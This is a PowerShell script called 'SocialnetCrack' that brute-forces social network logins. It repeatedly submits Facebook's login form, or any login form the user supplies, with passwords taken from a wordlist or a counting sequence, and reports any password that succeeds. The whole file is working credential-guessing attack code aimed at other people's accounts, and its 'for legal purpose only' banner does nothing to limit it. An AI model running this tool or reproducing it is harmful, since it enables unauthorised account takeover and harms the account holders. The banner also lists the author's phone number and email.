[console]::Title = "SocialnetCrack"
[console]::ForegroundColor = 'white'
"    _____________________________________________  
    |==>Social network password attacking tool<==|
    ----------------------------------------------

    ==============================================
    ============== by N47n@31 Wub3t ==============
    ============ phone: +251941226507 ============
    ========= email: natyw4122@gmail.com =========
    ============ facebook: naty.wubet ============
    ==============================================
    =========== for legal purpose only ===========
    ==============================================
    
    "
[console]::ForegroundColor = 'green'
function sn
{
    
    Write-Host "Social networks attack" -ForegroundColor Cyan
    "
  Choose site
    
    (1) Facebook
    (2) others
    
    "
    $choose = Read-Host
    function login ($uri, $uf, $pf, $pass, $user)
    {
        try
        {
            $req = Invoke-WebRequest -Uri $uri -SessionVariable var
            $Form = $req.Forms[0]
            $Form.Fields["$uf"] = "$user"
            $Form.Fields["$pf"] = "$pass"
            $ur2 = ($uri) -replace ("login.php")
            $r = Invoke-WebRequest -Uri ("$ur2" + $Form.Action) -WebSession $var -Method Post -Body $Form.Fields
        } catch {
            Write-Host "Error while connecting" -ForegroundColor DarkGreen
        } 
        if (($r.StatusDescription) -eq "OK")
        {
            if ((($r.Forms).id) -eq "login_form")
            {
                Write-Host "Failed" -ForegroundColor Red
                1
            } else {
                Write-Host "Success" -ForegroundColor Magenta
                0
            }
        }
    }
    ""
    if ($choose -eq 1)
    {
        $usern = Read-Host "Email or id"
        $list = Read-Host "Password list('1' for numberic attack)"
          if ($list -eq 1)
    {
        $i=000000;$s=0
        while ($s -lt 2)
        {
            Write-Host "trying $i" -ForegroundColor Green -NoNewline
            $log =login -uri http://www.facebook.com/login.php? -uf email -pf pass -user $usern -pass $i
            if ($log -eq 0)
            {
                #Write-Host "done: the password is $i" -ForegroundColor Green
                $s=4;break;
            } else {
                #Write-Host "failed by $i" -ForegroundColor Cyan
            }
            $i++
        }
    } else {
        foreach ($tmp in (gc $list))
        {
            Write-Host "trying by $tmp " -ForegroundColor Green -NoNewline
            $log = login -uri http://www.facebook.com/login.php? -uf email -pf pass -user $usern -pass $tmp 
            if ($log -eq 0)
            {
                #Write-Host "done: the password is $tmp" -ForegroundColor Green
                $s=4;break;
            } else {
                #Write-Host "failed by $tmp" -ForegroundColor Cyan
            }
        }
    }
        
        
    } else {
        $url = Read-Host -Prompt "URL"
        $urf = Read-Host -Prompt "User field"
        $psf = Read-Host -Prompt "password field"
        $usern = Read-Host -Prompt "email"
        $list = Read-Host -Prompt "password list ('1' for numberic attack)"
    
    if ($list -eq 1)
    {
        $i=0;$s=0
        while ($s -lt 2)
        {
            $log = login -uri $url -uf $urf -pf $psf -user $usern -pass $i
            if ($log -eq 0)
            {
                Write-Host "done: the password is $i" -ForegroundColor Green
                $s=4;break;
            } else {
                Write-Host "failed by $i" -ForegroundColor Cyan
            }
            $i++
        }
    } else {
        foreach ($tmp in (gc $list))
        {
            $log = login -uri $url -uf $urf -pf $psf -user $usern -pass $tmp
            if ($log -eq 0)
            {
                Write-Host "done: the password is $tmp" -ForegroundColor Green
                $s=4;break;
            } else {
                Write-Host "failed by $tmp" -ForegroundColor Cyan
            }
        }
    }
    }
}
while ($true)
{
    sn
}